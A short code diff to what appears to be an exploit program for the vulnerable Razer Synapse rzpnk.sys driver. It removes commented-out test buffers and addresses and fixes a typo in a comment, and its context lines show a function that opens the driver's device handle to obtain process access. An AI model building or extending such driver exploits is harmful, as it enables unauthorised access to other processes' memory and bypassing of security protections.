@@ -35,12 +35,6 @@ struct buffer {
 
 HANDLE hTarget = NULL;
 
-//char bufferRead[BUFSIZE] = { "" };
-//char bufferWrite[BUFSIZE] = { "hell2" };
-//SIZE_T bytesRead = 0x4;
-//SIZE_T bytesWrite = 0x5;
-//intptr_t addressRead = 0x0000000144BC6000;
-//intptr_t addressWrite = 0x0000000144BC6000;
 
 bool ExploitRazerDriver() {
 	HANDLE hDevice = CreateFile("\\\\.\\47CD78C9-64C3-47C2-B80F-677B887CF095", FILE_SHARE_WRITE | FILE_SHARE_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -140,7 +134,7 @@ int main()
 	PMRequest.address = 0x0;
 	SecureZeroMemory(PMRequest.buffer, BUFSIZE - 1);
 	PMRequest.size = 0x0;
-	// Connecting the vulnerable driver (Razer Senapyse rzpnk.sys ZwOpenProcess - ZwOpenProcess)
+	// Connecting the vulnerable driver (Razer Synapse rzpnk.sys ZwOpenProcess - ZwOpenProcess)
 	ExploitRazerDriver();
 
 	handleTests(hTarget);
